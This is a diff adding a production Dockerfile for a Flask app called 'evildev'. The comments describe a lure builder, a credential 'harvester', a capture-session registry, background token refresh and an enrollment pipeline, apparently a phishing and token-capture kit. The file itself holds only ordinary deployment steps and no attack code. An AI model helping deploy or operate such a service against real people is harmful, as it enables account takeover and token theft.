@@ -1,0 +1,103 @@
+# Production Dockerfile
+FROM python:3.11-slim
+
+# Avoid prompts
+ENV DEBIAN_FRONTEND=noninteractive \
+    PYTHONUNBUFFERED=1 \
+    PIP_NO_CACHE_DIR=1 \
+    PIP_DISABLE_PIP_VERSION_CHECK=1
+
+# System deps
+RUN apt-get update \
+    && apt-get install -y --no-install-recommends \
+        gcc \
+        libpq-dev \
+        curl \
+        sqlite3 \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create a non-root user with a fixed UID so host bind mounts can be
+# chowned to match. Use UID 1000 (the conventional first-user UID on Linux)
+# rather than letting useradd pick one, so `chown -R 1000:1000 ./data` on
+# the host lines up with the container user.
+RUN groupadd --gid 1000 appuser \
+    && useradd --uid 1000 --gid 1000 --create-home --shell /bin/bash appuser
+
+WORKDIR /home/appuser/app
+
+# Copy only requirements first so the pip layer is cached independently of
+# application code changes.
+COPY requirements.txt ./
+RUN pip install --no-cache-dir --upgrade pip setuptools wheel \
+    && pip install --no-cache-dir -r requirements.txt gunicorn
+
+# Copy app code
+COPY . /home/appuser/app
+
+# Create the persistent runtime directories and hand them to appuser. If the
+# container is later run with bind mounts, the host directory's ownership
+# must also be UID 1000 or appuser won't be able to write.
+#
+# builder_data/ lives under data/ so it inherits the /home/appuser/app/data
+# volume that docker-compose already bind-mounts from ./data. That makes
+# saved lure templates and built artefacts survive container recreation.
+RUN mkdir -p \
+        /home/appuser/app/data \
+        /home/appuser/app/data/builder_data/templates \
+        /home/appuser/app/data/builder_data/output \
+        /home/appuser/app/drs_out \
+        /home/appuser/app/logs \
+        /home/appuser/app/configs \
+        /home/appuser/app/email_templates \
+    && chown -R appuser:appuser /home/appuser/app
+
+# Declare the paths that should be persisted. Docker will auto-create
+# anonymous volumes for any of these the operator doesn't bind-mount.
+VOLUME [ \
+    "/home/appuser/app/data", \
+    "/home/appuser/app/drs_out", \
+    "/home/appuser/app/logs", \
+    "/home/appuser/app/configs", \
+    "/home/appuser/app/email_templates" \
+]
+
+USER appuser
+
+# Runtime paths — these point at the volume-backed directories above.
+#
+# BUILDER_DATA_PATH keeps the lure builder's saved templates and build
+# artefacts inside the data volume. Without it, builder_bp.py falls back
+# to <repo>/builder_data, which is inside the container's writable layer
+# and disappears on every restart.
+ENV PORT=5000 \
+    REQUIRE_AUTH=true \
+    FLASK_ENV=production \
+    PROJECT_DB_PATH=/home/appuser/app/data/project_data.db \
+    HARVESTER_STATE_FILE=/home/appuser/app/data/harvester_state.json \
+    BUILDER_DATA_PATH=/home/appuser/app/data/builder_data \
+    DRS_OUT_PATH=/home/appuser/app/drs_out \
+    LOG_DIR=/home/appuser/app/logs
+
+EXPOSE 5000
+
+# Gunicorn with a single worker and many threads.
+#
+# DO NOT use `-w 3` here. This app has in-memory state that would fork and
+# desync across workers:
+#
+#   - sessions = {} in app.py — the capture-session registry
+#   - token_refresh_manager — a background thread that refreshes tokens
+#   - the enrollment dispatcher — one-shot per process via _STARTUP_ENROLL_DISPATCHED
+#   - SQLite with WAL — multiple writers cause "database is locked" storms
+#
+# Multiple workers would each spawn their own refresh loop and each try to
+# run the startup enrollment pipeline. `-w 1 --threads 8` keeps everything
+# in one process and lets concurrent HTTP requests still be served.
+CMD ["gunicorn", \
+     "--workers", "1", \
+     "--threads", "8", \
+     "--timeout", "300", \
+     "--bind", "0.0.0.0:5000", \
+     "--access-logfile", "-", \
+     "--error-logfile", "-", \
+     "evildev.app:app"]
